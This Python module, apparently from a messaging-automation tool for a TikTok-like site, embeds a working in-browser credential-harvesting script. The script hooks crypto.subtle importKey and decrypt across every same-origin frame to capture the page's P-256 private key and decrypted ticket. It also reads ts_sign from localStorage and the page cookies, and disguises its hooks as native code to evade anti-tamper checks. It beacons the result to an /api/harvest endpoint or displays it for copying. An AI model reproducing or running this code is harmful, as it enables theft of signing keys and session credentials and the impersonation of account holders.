"""Credential harvesting.

Getting write credentials out of a signed-in browser is the one step of this
project that cannot be done from the server: the key material only exists inside
the page, at the moment the page signs a request.

What a page-level script *can* reach, and what it cannot, was established by
measurement on this target:

  reachable
    - the P-256 private key   — `crypto.subtle.importKey('pkcs8', ...)` is a
      standard API and is not bypassed by the SDK's anti-tamper posture
    - the plaintext ticket    — `crypto.subtle.decrypt(...)` returns it
    - `ts_sign`               — sits in localStorage in the clear
  NOT reachable
    - `tt-ticket-guard-*` request headers and the request body — the SDK caches
      native references to XHR/fetch at init, so page-level hooks never observe
      its own calls
    - the session cookie      — `sessionid` and friends are HttpOnly

Two more things measurement settled, both of which shaped the design:

  * the IM client runs inside a **same-origin iframe**, and each frame is its own
    JS realm — a hook on the top window never sees the signing calls, so the
    script walks every same-origin frame, and re-walks periodically because
    frames appear late;
  * the site's **CSP blocks both `script-src` and `connect-src` to 127.0.0.1**.
    A `<script src>` from this server fails with `failed - csp`, and a beacon to
    it returns true but never arrives. So the script cannot post its result back:
    it shows the payload in an overlay with a copy button, and the user pastes it
    into the wizard. The automatic report below is kept — it costs nothing and
    works on hosts without that CSP — but nothing depends on it.
"""
import threading
import time

SCRIPT_TEMPLATE = r"""(function () {
  var BACKEND = '__BACKEND__';
  var TAG = '[tk-harvest]';
  if (window.__tkHarvest && window.__tkHarvest.report) {
    window.__tkHarvest.report(true);
    return 'harvest already installed (re-reported)';
  }

  var S = {
    at: Date.now(),
    page: location.origin + location.pathname,
    frames: 0,
    hooked: [],
    private_key: '',
    ticket: '',
    ts_sign: '',
    cookie: '',
    notes: [],
    sent: false
  };
  window.__tkHarvest = S;

  var NATIVE = 'function () { [native code] }';
  function mask(fn, name) {
    try {
      Object.defineProperty(fn, 'toString', { value: function () { return NATIVE; } });
      Object.defineProperty(fn, 'name', { value: name });
    } catch (e) {}
    return fn;
  }
  function hex(u8) {
    var s = '';
    for (var i = 0; i < u8.length; i++) { s += ('0' + u8[i].toString(16)).slice(-2); }
    return s;
  }
  function asBytes(d) {
    try {
      if (d instanceof ArrayBuffer) { return new Uint8Array(d); }
      if (ArrayBuffer.isView(d)) { return new Uint8Array(d.buffer, d.byteOffset, d.byteLength); }
    } catch (e) {}
    return null;
  }
  function asText(u8) {
    try { return new TextDecoder().decode(u8); } catch (e) { return ''; }
  }
  var HEX64 = /[0-9a-f]{64}/i;

  /* --- same-origin windows: the IM client lives in an iframe ------------- */
  function targets() {
    var out = [window];
    for (var i = 0; i < window.frames.length; i++) {
      try {
        var f = window.frames[i];
        if (f.location.href) { out.push(f); }
      } catch (e) {}
    }
    return out;
  }

  function installInto(w) {
    if (!w || w.__tkHarvestHooked) { return; }
    var sub;
    try { sub = w.crypto.subtle; } catch (e) { return; }
    if (!sub) { return; }
    w.__tkHarvestHooked = true;

    var oImport = sub.importKey.bind(sub);
    sub.importKey = mask(function (fmt, data, algo, ext, usages) {
      try {
        if (String(fmt).toLowerCase() === 'pkcs8') {
          var u8 = asBytes(data);
          if (u8 && u8.length > 60) {
            S.private_key = hex(u8);
            if (S.notes.indexOf('pkcs8') < 0) { S.notes.push('pkcs8 ' + u8.length + 'B'); }
            tick();
          }
        }
      } catch (e) {}
      return oImport(fmt, data, algo, ext, usages);
    }, 'importKey');

    var oDecrypt = sub.decrypt.bind(sub);
    sub.decrypt = mask(function (algo, key, data) {
      var pr = oDecrypt(algo, key, data);
      try {
        pr.then(function (buf) {
          var u8 = asBytes(buf);
          if (!u8 || !u8.length) { return; }
          var m = asText(u8).match(HEX64);
          if (m) {
            S.ticket = String(m[0]).toLowerCase();
            if (S.notes.indexOf('decrypt') < 0) { S.notes.push('decrypt ' + u8.length + 'B'); }
            tick();
          }
        })['catch'](function () {});
      } catch (e) {}
      return pr;
    }, 'decrypt');

    S.hooked.push(String(w.location.href).slice(0, 40));
  }

  function sweep() {
    var ws = targets();
    S.frames = ws.length;
    for (var i = 0; i < ws.length; i++) { installInto(ws[i]); }
  }

  /* --- ts_sign (plaintext in localStorage) ------------------------------ */
  function readTsSign() {
    try {
      var raw = localStorage.getItem('security-sdk/s_sdk_sign_data_key/tt_fetch');
      if (!raw) { return; }
      var outer = JSON.parse(raw);
      var inner = JSON.parse(outer.data || '{}');
      if (inner.ts_sign) {
        S.ts_sign = inner.ts_sign;
        if (S.notes.indexOf('ts_sign') < 0) { S.notes.push('ts_sign'); }
      }
    } catch (e) {}
  }

  function readCookie() {
    try { S.cookie = document.cookie || ''; } catch (e) {}
  }

  /* --- best-effort automatic report (blocked by this site's CSP) --------- */
  function report(force) {
    readTsSign(); readCookie(); sweep();
    if (S.sent && !force) { return; }
    S.sent = true;
    S.reported_at = Date.now();
    var payload = JSON.stringify(S);
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(BACKEND + '/api/harvest',
                             new Blob([payload], { type: 'text/plain;charset=UTF-8' }));
      }
    } catch (e) {}
    console.log(TAG, 'payload (paste this into the wizard):');
    console.log(payload);
    paint();
    return payload;
  }
  S.report = report;

  /* --- overlay ---------------------------------------------------------- */
  var box = null, els = null, lastPayload = null;

  function build() {
    box = document.createElement('div');
    box.style.cssText = 'position:fixed;z-index:2147483647;right:16px;bottom:16px;width:360px;' +
      'font:12px/1.55 ui-monospace,Consolas,monospace;background:#111;color:#eee;' +
      'padding:11px 13px;border-radius:9px;box-shadow:0 8px 28px rgba(0,0,0,.5)';
    box.innerHTML =
      '<div style="font-weight:600;margin-bottom:6px">tk-message-demo · 凭据收割</div>' +
      '<div data-r="k"></div><div data-r="t"></div><div data-r="s"></div>' +
      '<div data-r="f" style="color:#666;margin-top:3px"></div>' +
      '<div data-r="hint" style="margin:7px 0 0"></div>' +
      '<textarea readonly spellcheck="false" style="width:100%;height:74px;margin-top:6px;' +
        'font:11px/1.4 ui-monospace,monospace;background:#000;color:#8f8;border:1px solid #333;' +
        'border-radius:5px;padding:5px;resize:vertical;box-sizing:border-box"></textarea>' +
      '<button style="margin-top:6px;padding:4px 12px;font:12px ui-monospace,monospace;' +
        'cursor:pointer;background:#2ea043;color:#fff;border:0;border-radius:5px">' +
        '复制凭据 JSON</button>';
    document.documentElement.appendChild(box);
    els = {
      k: box.querySelector('[data-r=k]'),
      t: box.querySelector('[data-r=t]'),
      s: box.querySelector('[data-r=s]'),
      f: box.querySelector('[data-r=f]'),
      hint: box.querySelector('[data-r=hint]'),
      ta: box.querySelector('textarea'),
      btn: box.querySelector('button')
    };
    els.btn.onclick = function () { copyText(els.ta.value); };
  }

  function copyText(text) {
    var done = false;
    try { navigator.clipboard.writeText(text); done = true; } catch (e) {}
    if (!done) {
      try {
        els.ta.focus(); els.ta.select();
        done = document.execCommand('copy');
      } catch (e) {}
    }
    els.btn.textContent = done ? '已复制 ✓ 去本地页面粘贴' : '复制失败，请全选文本框手动复制';
  }

  function row(el, label, ok, val) {
    el.innerHTML = '<span style="color:#888">' + label + '</span> <span style="color:' +
      (ok ? '#5ddc7d' : '#e6a23c') + '">' + val + '</span>';
  }

  function paint() {
    try {
      if (!box) { build(); }
      row(els.k, 'private key', !!S.private_key, S.private_key ? 'captured' : 'waiting…');
      row(els.t, 'ticket', !!S.ticket, S.ticket ? 'captured' : 'waiting…');
      row(els.s, 'ts_sign', !!S.ts_sign, S.ts_sign ? 'captured' : 'waiting…');
      els.f.textContent = 'frames ' + S.frames + ' · hooked ' + S.hooked.length;
      var ready = !!(S.private_key && S.ticket && S.ts_sign);
      els.hint.innerHTML = ready
        ? '<span style="color:#5ddc7d">已捕获齐 —— 点下面按钮复制，粘到本地向导第 2 步</span>'
        : '<span style="color:#c9a227">请在本页发一条消息以触发签名</span>';
      var payload = JSON.stringify(S);
      if (payload !== lastPayload && document.activeElement !== els.ta) {
        els.ta.value = payload;
        lastPayload = payload;
      }
    } catch (e) {}
  }

  var timer = null;
  function tick() {
    readTsSign();
    sweep();
    paint();
    if (S.private_key && S.ticket && S.ts_sign && !S.sent) {
      if (timer) { clearInterval(timer); timer = null; }
      setTimeout(function () { report(); }, 400);
    }
  }

  sweep();
  readTsSign();
  readCookie();
  paint();
  timer = setInterval(function () { sweep(); readTsSign(); paint(); }, 2000);
  console.log(TAG, 'installed — hooked ' + S.hooked.length + ' of ' + S.frames +
                   ' window(s); now send one message in this page');
  return 'harvest installed (' + S.frames + ' windows)';
})()"""


class Pending:
    """The most recent harvest, waiting for the user to confirm it."""

    def __init__(self, ttl=900):
        self._lock = threading.Lock()
        self._data = None
        self._ttl = ttl

    def put(self, payload):
        with self._lock:
            self._data = {'received_at': int(time.time() * 1000), 'payload': payload}
        return self._data

    def get(self):
        with self._lock:
            d = self._data
        if not d:
            return None
        if time.time() * 1000 - d['received_at'] > self._ttl * 1000:
            return None
        return d

    def clear(self):
        with self._lock:
            self._data = None


def build_script(backend_base):
    return SCRIPT_TEMPLATE.replace('__BACKEND__', backend_base.rstrip('/'))


def summarise(payload):
    """Trim a raw harvest into what the UI should show."""
    p = payload or {}
    key = p.get('private_key') or ''
    return {
        'page': p.get('page') or '',
        'received_at': p.get('at'),
        'frames': p.get('frames') or 0,
        'hooked': len(p.get('hooked') or []),
        'has_private_key': bool(key),
        'private_key_hint': ('%s…%s' % (key[:12], key[-8:])) if key else '',
        'ticket_hint': (p.get('ticket') or '')[:12] + ('…' if p.get('ticket') else ''),
        'has_ticket': bool(p.get('ticket')),
        'ts_sign_hint': (p.get('ts_sign') or '')[:20] + ('…' if p.get('ts_sign') else ''),
        'has_ts_sign': bool(p.get('ts_sign')),
        'cookie_names': [c.split('=')[0] for c in (p.get('cookie') or '').split('; ') if c],
        'notes': p.get('notes') or [],
    }
